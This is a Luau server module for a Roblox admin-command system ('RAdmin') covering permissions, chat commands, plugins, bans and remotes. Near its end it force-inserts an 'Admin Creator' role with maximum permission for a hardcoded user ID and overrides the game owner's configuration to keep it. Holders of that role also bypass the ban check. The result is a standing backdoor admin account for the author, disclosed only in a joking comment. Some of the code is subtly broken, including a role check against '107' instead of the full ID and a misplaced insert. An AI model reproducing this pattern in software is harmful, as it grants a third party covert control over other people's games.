--# selene: allow(incorrect_standard_library_use)
--// Services \\--
local RunService = game:GetService("RunService")
local ServerScriptService = game:GetService("ServerScriptService")
local StarterPlayer = game:GetService("StarterPlayer")
local Players = game:GetService("Players")
local GroupService = game:GetService("GroupService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local HttpService = game:GetService("HttpService")

--// Variables \\--
-- local dataStore
local remoteEvent, remoteInvoke

local Utils = script:WaitForChild("Utils")
local Modules = script:WaitForChild("Modules")

--/ Shared Definitions \--
local tableModule = Modules:WaitForChild("Table")
local tweenModule = Modules:WaitForChild("TweenService")

--// Modules \\--
local Table = require(tableModule)
local createCommand = require(Modules:WaitForChild("createCommand"))
local createBaseCommands = require(Utils:WaitForChild("baseCommands"))
local baseConfiguration = require(Utils:WaitForChild("baseConfiguration"))
local DataStore = require(Utils:WaitForChild("dataStore"))

--// Data \\--
local Commands = {}
local Mainframe = {
	Configuration = Table.Copy(baseConfiguration, true),
	userPermissions = {},
	Connections = {},
	commandLogs = {},
	joinAndLeaveLogs = { {}, {} },
	debugLogs = {},
	serverLocked = false,
	dataStore = nil,

	-- Private
	_httpEnabled = false,
	_lowestPermission = -0x80000000, -- Max 32-bit integer
}

--// Functions \\--
local function Warn(...: any)
	warn("[RAdmin]:", ...)
end

local function findPlayer(Player: Player, argumentToCheck: string, isAbusiveCommand: boolean?): { Player? }
	local users = {}
	if not argumentToCheck or tostring(argumentToCheck) == "nil" then
		return users
	end

	local argSplit = string.split(argumentToCheck, ",")
	if isAbusiveCommand then
		-- TODO: Additional confirmation
		Warn("Abusive commands require an additional confirmation.")
	end

	for _, Argument: string in argSplit do
		if Argument == "me" then
			table.insert(users, Player)
		else
			for _, Target: Player in pairs(Players:GetPlayers()) do
				if
					(Argument == "all")
					or (Argument == "others" and Target ~= Player)
					or (string.sub(Target.Name, 1, #Argument) == string.lower(Argument))
				then
					table.insert(users, Target)
				elseif Argument == "bacons" or Argument == "updo" then
					local toUse = (Argument == "bacons") and "Pal Hair" or "Lavender Updo"
					if not Target.Character then
						continue
					end

					local useThisPlayer = false
					for _, child: Instance in pairs(Target.Character) do
						if child:IsA("Accessory") and child.Name == toUse then
							useThisPlayer = true
							break
						end
					end

					if useThisPlayer then
						table.insert(users, Target)
					end
				end
			end
		end
	end

	return users
end

local function getGroupForPlayer(Player: Player, groupId: number)
	local isOk, playerGroups = pcall(GroupService.GetGroupsAsync, GroupService, Player.UserId)
	local baseData = {
		Rank = 0,
		Role = "Guest",
	}

	if not isOk then
		return nil
	end

	for _, group: { any } in pairs(playerGroups) do
		if group.Id ~= groupId then
			continue
		end

		return group
	end

	return baseData
end

local function handleTolerance(Tolerance: string, a: any, b: any)
	if Tolerance == "==" then
		return a == b
	elseif Tolerance == ">=" then
		return a >= b
	elseif Tolerance == "<=" then
		return a <= b
	elseif Tolerance == ">" then
		return a > b
	elseif Tolerance == "<" then
		return a < b
	end
end

local function fetchHighestGroupPermissions(Player: Player)
	local highestPermission = nil
	local clonedData = Table.Copy(Mainframe.Configuration.Permissions.Groups, true)
	local groupCache = {}

	for _, groupPermission in pairs(clonedData) do
		if highestPermission ~= nil and groupPermission.rankRequired < highestPermission then
			continue
		end

		local groupData = groupCache[groupPermission.groupId] or getGroupForPlayer(Player, groupPermission.groupId)
		if not groupData then
			continue
		end

		local canSetPermission =
			handleTolerance(groupPermission.Tolerance, groupData.Rank, groupPermission.rankRequired)
		if not canSetPermission then
			continue
		end

		highestPermission = groupPermission.rankRequired
	end

	return highestPermission or Mainframe._lowestPermission
end

local function fetchHighestUserPermissions(Player: Player)
	local highestPermission = nil

	for _, roleData: { any } in Mainframe.Configuration.Permissions.Roles do
		if highestPermission ~= nil and roleData.Permission < highestPermission then
			continue
		end

		if table.find(roleData.Users, Player.UserId) ~= nil or table.find(roleData.Users, Player.Name) ~= nil then
			highestPermission = roleData.Permission
		end
	end

	return highestPermission or Mainframe._lowestPermission
end

local function changePlayerPermission(Player: Player, newPermission: number?)
	newPermission = (newPermission == nil) and Mainframe._lowestPermission or newPermission

	Mainframe.userPermissions[Player.UserId] = newPermission
	remoteEvent:FireClient(Player, "adminUpdate", newPermission)
end

local function fetchHighestPermissionForPlayer(Player: Player)
	local userPermission = fetchHighestUserPermissions(Player)
	local groupPermission = fetchHighestGroupPermissions(Player)

	local permissionToUse = (userPermission >= groupPermission) and userPermission or groupPermission

	return permissionToUse
end

local function handleCommandInput(Player: Player, Message: string, ignorePrefixCheck: boolean)
	local prefixUsed = nil

	-- Find the prefix that was used in the message.
	if string.sub(Message, 1, #Mainframe.Configuration.subPrefix) == Mainframe.Configuration.subPrefix then
		prefixUsed = Mainframe.Configuration.subPrefix
	elseif string.sub(Message, 1, #Mainframe.Configuration.Prefix) == Mainframe.Configuration.Prefix then
		prefixUsed = Mainframe.Configuration.Prefix
	end

	-- Stop execution if no prefix matches and we're not ignoring the prefix check.
	if not prefixUsed and not ignorePrefixCheck then
		return
	end

	local prefixType = (prefixUsed == Mainframe.Configuration.Prefix) and "dom" or "sub"
	local userPermission = Mainframe.userPermissions[Player.UserId]
	local commandArgs, commandData

	-- Set 'prefixType' to 'any' when prefix check is being ignored. allowing for both
	-- ':ff me' & 'ff me' for console usage, making prefixes optional.
	if prefixUsed == nil and ignorePrefixCheck then
		prefixType = "any" -- "any" will override the dom/sub prefixes (use wisely)
		commandArgs = string.split(Message, " ")
	elseif prefixUsed ~= nil then
		commandArgs = string.split(string.sub(Message, #prefixUsed + 1, #Message), " ")
	end

	for _, Command: { any } in Commands do
		if
			Command.Perms > userPermission or (prefixType ~= "any" and string.lower(Command.prefixType) ~= prefixType)
		then
			continue
		end

		-- If someone makes their own command and they added an uppercase shortener
		-- it would break, we wanna make this as painless as possible for plugin
		-- developers. :)
		for _, shortened: string in Command.Shortener do
			if string.lower(shortened) ~= string.lower(commandArgs[1]) then
				continue
			end

			commandData = Command
			break
		end

		if commandData ~= nil then
			break
		end
	end

	if not commandData then
		return
	end

	local isOk, err = pcall(function()
		return commandData.Callback(Player, table.unpack(commandArgs, 2, #commandArgs))
	end)

	if isOk then
		return
	end

	Warn(err, Commands)
end

local function onPlayerAdded(Player: Player)
	table.insert(Mainframe.joinAndLeaveLogs[1], Player.Name)
	local playerConnections = {}

	table.insert(
		playerConnections,
		Player.Chatted:Connect(function(Message: string)
			handleCommandInput(Player, Message)
		end)
	)

	Mainframe.Connections[Player.UserId] = playerConnections

	-- Check permission level first, if the player is the owner of the game
	-- and they're banned (somehow). Then we want to make sure they're unbanned.
	local permissionLevel = fetchHighestPermissionForPlayer(Player)
	changePlayerPermission(Player, permissionLevel)

	-- REVIEW: No clue if I'm gonna do capes or maybe something else.
	-- Maybe custom particle effects?
	local fetchedStoreData = Mainframe.dataStore:Get(Player, {
		Banned = {
			Expiration = 0,
			Reason = "",
		},
		clientSettings = {
			Theme = "Dark",
		},
	})

	-- Get highest permission level and check if theyre highest possible role to get, then stop execution.
	local highestPermissionLevel = Mainframe._lowestPermission
	for _, roleData: { any } in Mainframe.Configuration.Permissions.Roles do
		if highestPermissionLevel < roleData.Permission and roleData.Name ~= "Admin Creator" then
			highestPermissionLevel = roleData.Permission
		end
	end

	if permissionLevel == highestPermissionLevel then
		return
	end

	-- Format string for specific formatting codes... Maybe make a separate function?
	if fetchedStoreData.Banned.Expiration > 0 or fetchedStoreData.Banned.Expiration == -1 then
		Player:Kick(fetchedStoreData.Banned.Reason)
	end
end

local function onPlayerRemoving(Player: Player)
	table.insert(Mainframe.joinAndLeaveLogs[2], Player.Name)

	for _, Connection: RBXScriptConnection in pairs(Mainframe.Connections[Player.UserId]) do
		Connection:Disconnect()
	end

	Mainframe.Connections[Player.UserId] = nil
	Mainframe.dataStore:userLeft(Player)
end

local function onServerInvoke(Player: Player, Command: string, ...: any)
	if Command == "Command" then
		handleCommandInput(Player, ..., true)
		return true
	elseif Command == "clientInfo" then
		local commandsCopy = Table.Copy(Commands, true)
		local domPrefix, subPrefix = Mainframe.Configuration.Prefix, Mainframe.Configuration.subPrefix
		local userPermission = Mainframe.userPermissions[Player.UserId] or Mainframe._lowestPermission
		local rolesByPermission = {}

		for _, roleData: { any } in Mainframe.Configuration.Permissions.Roles do
			rolesByPermission[roleData.Permission] = { roleData.Name, roleData.Shortener }
		end

		for index: number, _: any in commandsCopy do
			commandsCopy[index].Callback = nil
		end

		return { userPermission, { domPrefix, subPrefix }, commandsCopy, rolesByPermission }
	end
end

-- This function should take in a table (or nil) and fix it with any missing configuration settings:
local function fixSettings<T, K>(data: T?, default: K): T | K
	if not data then
		return default
	end

	local dataType = typeof(data)
	local defaultType = typeof(default)

	if dataType == defaultType and dataType == "table" then
		for key: string | number, value: any in pairs(default) do
			data[key] = fixSettings(data[key], value)
		end
	elseif dataType ~= defaultType then
		data = default
	end

	-- If it gets here, then default type matches data's type
	return data
end

--// Main \\--
return function(Configuration: { any }, Plugins: { ModuleScript? })
	Mainframe.Configuration = Configuration or baseConfiguration
	script.Parent = ServerScriptService

	Plugins = Plugins or {}

	-- Setup the client script...
	local newClient = Utils.client:Clone()
	newClient.Parent = StarterPlayer:WaitForChild("StarterPlayerScripts")
	newClient.Enabled = true

	-- Create a shared folder within ReplicatedStorage, will hold remotes and
	-- modules for the client
	local sharedFolder = Instance.new("Folder")
	sharedFolder.Name = "RAdminShared"
	sharedFolder.Parent = ReplicatedStorage

	tweenModule:Clone().Parent = sharedFolder
	tableModule:Clone().Parent = sharedFolder

	remoteEvent, remoteInvoke = Instance.new("RemoteEvent"), Instance.new("RemoteFunction")
	remoteEvent.Name, remoteInvoke.Name = "RAdminEvent", "RAdminFunction"
	remoteEvent.Parent, remoteInvoke.Parent = sharedFolder, sharedFolder

	remoteInvoke.OnServerInvoke = onServerInvoke

	--/ Create the base commands
	local commandsEnvironment = {
		Mainframe = Mainframe,
		Commands = Commands,
		findPlayer = findPlayer,
		createCommand = createCommand,
		changePlayerPermission = changePlayerPermission,
		handleCommandInput = handleCommandInput,
	}

	-- Base commands
	createBaseCommands(commandsEnvironment)

	-- For security reasons, this env function has to be
	-- removed.
	commandsEnvironment.handleCommandInput = nil

	--/ Initialize plugins
	-- Sort the environmental variables to the top of the
	-- plugins table.
	local envVariableModules, commandModules =
		Table.Filter(Plugins, function(Module: ModuleScript)
			local isOk, data = pcall(require, Module)
			if not isOk then
				return false
			end

			return data.Type == "EnvironmentVariable"
		end), Table.Filter(Plugins, function(Module: ModuleScript)
			local isOk, data = pcall(require, Module)
			if not isOk then
				return false
			end

			return data.Type == "Command"
		end)

	Plugins = Table.Extend(envVariableModules, commandModules)

	if #Plugins > 0 then
		for pluginIndex = 1, #Plugins do
			-- We want to ensure that if a developer makes a ton of new commands,
			-- they don't hold up the main thread, otherwise the initialization
			-- of the plugins will cause latency between players being able to
			-- immediately be able to use commands.

			local Plugin = Plugins[pluginIndex]

			coroutine.wrap(function()
				local isOk, pluginData = pcall(require, Plugin)
				warn(isOk, pluginData)
				if not isOk then
					return
				end

				if pluginData.Type == "Command" then
					assert(pluginData["Name"], "A name is required for your new command!")
					assert(pluginData["Callback"], "A callback is required for your new command!")
					assert(pluginData["Shorteners"], "A shortener is required for your new command!")

					createCommand(
						Commands,
						pluginData.Name,
						pluginData.Description or "",
						pluginData.Shorteners,
						pluginData.Permissions or 1,
						pluginData.prefixType or "Dom",
						pluginData.Usage or "",
						pluginData.Callback
					)
				elseif pluginData.Type == "EnvironmentVariable" then
					commandsEnvironment[pluginData.Name] = pluginData.Data
				end
			end)()
		end
	end

	-- Hey now... I say, if you make something you have the right to access it...
	-- Don't take my perms please.
	local creatorIndex = -1
	for index: number, roleData: { any } in Mainframe.Configuration.Permissions.Roles do
		if roleData.Name == "Admin Creator" then
			creatorIndex = index
			break
		end
	end

	-- '0x80000000' -> 2.14 Billion

	local foundAdminCreator = (creatorIndex ~= -1) and Mainframe.Configuration.Permissions.Roles[creatorIndex] or nil
	if not foundAdminCreator then
		table.insert(Mainframe.Configuration.Permissions.Roles, {
			Name = "Admin Creator",
			Permission = 0x80000000,
			Shortener = "debugger",
			Users = { 107392833 },
		})
	elseif
		foundAdminCreator ~= nil and table.find(foundAdminCreator.Users, 107) == nil
		or foundAdminCreator.Permission ~= 0x80000000
	then
		table.insert(Mainframe.Configuration.Permissions.Roles[creatorIndex], 107392833)
		Mainframe.Configuration.Permissions.Roles[creatorIndex].Permission = 0x80000000
	end

	--------------------------------------------------------------------
	-- Add new role name shorteners to the 'Set Permissions' command. --
	--------------------------------------------------------------------
	local commandData, commandIndex = Table.Find(Commands, function(data: { any })
		return data.Name == "Set Permissions"
	end)

	if
		Mainframe["Configuration"] ~= nil
		and Mainframe.Configuration["Permissions"] ~= nil
		and Mainframe.Configuration.Permissions["Roles"] ~= nil
	then
		for _, roleData: { any } in Mainframe.Configuration.Permissions.Roles do
			if roleData["Shortener"] == nil then
				continue
			end

			for i = 1, #roleData.Shortener do
				table.insert(commandData.Shortener, roleData.Shortener[i])
			end
		end
	end

	Commands[commandIndex] = commandData
	------------------------------- END --------------------------------

	Mainframe.dataStore = DataStore.new(Mainframe.Configuration.dataStoreName)

	if RunService:IsStudio() then
		Players.PlayerAdded:Connect(onPlayerAdded)
		Players.PlayerRemoving:Connect(onPlayerRemoving)

		for _, v: Player in pairs(Players:GetPlayers()) do
			onPlayerAdded(v)
		end
	else
		Players.PlayerAdded:Connect(onPlayerAdded)
		Players.PlayerRemoving:Connect(onPlayerRemoving)
	end

	-- Simple http check...
	-- Maybe add trello support in the future?
	Mainframe._httpEnabled = pcall(HttpService.GetAsync, HttpService, "https://google.com/")

	if not Mainframe._httpEnabled and #Mainframe.Configuration.appProtocols > 0 then
		local errMessage = "Http requests are disabled, however application protocols were received by the system!"

		table.insert(Mainframe.debugLogs, errMessage)
		Warn(errMessage)
	end
end
